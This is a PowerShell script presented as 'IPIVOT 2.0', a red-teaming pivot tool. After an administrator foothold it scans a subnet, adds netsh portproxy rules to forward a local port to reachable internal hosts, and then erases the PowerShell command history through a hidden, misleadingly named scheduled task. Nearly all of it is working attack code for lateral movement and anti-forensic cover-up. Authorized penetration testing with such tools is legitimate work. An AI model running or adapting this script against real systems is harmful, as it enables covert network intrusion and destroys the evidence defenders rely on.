<#
.PARAMETER ConnectingPort
Change this to the connecting port 

.PARAMETER ListeningPort
Change this to the listening port 

.PARAMETER ListeningAddress
Change this to the listening IP address you want to set the forwarding to 

.PARAMETER Network
Change this to the target network you're working on i.e 192.168.0 

.PARAMETER HostRange
Change this to determine the range or leave as default depending on your needs
#>
param (
    [int]$ConnectingPort = 9080,
    [int]$ListeningPort = 9999,
    [string]$ListeningAddress = '127.0.0.1',
    [string]$Network = '192.168.0',
    [int[]]$HostRange = 1..2
)

Write-Output "
****************************************************************************                      
              # # # # # # #
              # # # # # # #
                  # #           
                 # #            
                # #         # # # #         #   #   #  #
               # #          #      ##     #   #    #  #  # 
              # #           #       ##  #   #          #  #   
             # #            #     ##    #   #          #   #  
            # #             #   ##       #    #       #   #
           # #              ##       # #   #    #   #   #  # #   
      # # # # # #           ##         # #   # #  #  #    # #
     # # # # # #            ##           # #            # #    
                            ##             # #        # #                   
                            ##               # #    # #                       
                            ##                  ####   2.0
    
    IPIVOT 2.0 - Red Teaming Tool
    By: @fort3 - Fortune Sam Okon
        @TrimarcJake - Jake Hildreth
    Description: A little pivoting tool for when your favourite meterpreter shell fails...
    Prequisites: Identify and Gain Initial Foothold on Target as Administrator
    
    PS: If you happen to find this tool useful then I wouldn't mind a mention ;)              
 ******************************************************************************* 
 "
$ErrorActionPreference= 'silentlycontinue'

#list the network and ports found and apply the forwarding
$i = 1
foreach ($HostAddress in $HostRange) {
    $ip = "{0}.{1}" -f $network, $HostAddress
    Write-Progress "Scanning Network" $ip -PercentComplete (($i / $HostRange.Count) * 100)
    If (Test-Connection -BufferSize 32 -Count 1 -quiet -ComputerName $ip) {
        $socket = new-object System.Net.Sockets.TcpClient($ip, $ConnectingPort)
        If ($socket.Connected) {
            "$ip port $ConnectingPort is open"
            Write-Progress "Forwarding from listening ${ListeningAddress}:$ListeningPort to target\n"
            Write-Output "Forwarding from listening ${ListeningAddress}:$ListeningPort to target......."

            Write-Output "____________________________________________________________________________________________________________________________"
            
            #piece of the script that does the forwarding
            try {
                Invoke-Expression "netsh interface portproxy add v4tov4 listenaddress=$($ListeningAddress) listenport=$($ListeningPort) connectaddress=$($ip) connectport=$($ConnectingPort)"
            } catch {
                Write-Warning "Could not forward ${ListeningAddress}:$ListeningPort to target......."
            }
            Write-Progress "Checking if host is listening on port $ListeningPort and $ConnectingPort`n"
            Write-Output "Checking if host is listening on port $ListeningPort and $ConnectingPort"
            
            #verify that the port is listening
            Get-NetTCPConnection -LocalPort $ListeningPort
            Get-NetTCPConnection -LocalPort $ConnectingPort
            Write-Output "***************************************************************************************************************************"
            $socket.Close() 
        } else { 
            "$ip port $ConnectingPort is not open "
            
        }
    }
}

Write-Output "***************************************************************************************************************************"
Write-Progress "Now clearing command history and footprints from powershell saved sessions......."
Write-Output "Now clearing command history and footprints from powershell saved sessions......."

#Create a scheduled task to clear the command history in PSReadLine\ConsoleHost_history.txt
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -Command Remove-Item -EA Stop (Get-PSReadlineOption).HistorySavePath "
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(4)

Register-ScheduledTask -TaskPath "Important" -TaskName "ImportantTask" -Description "Sanitization" -Action $action -Trigger $trigger

#Remove the scheduled task upon script completion
Unregister-ScheduledTask -TaskName "ImportantTask" -Confirm:$false
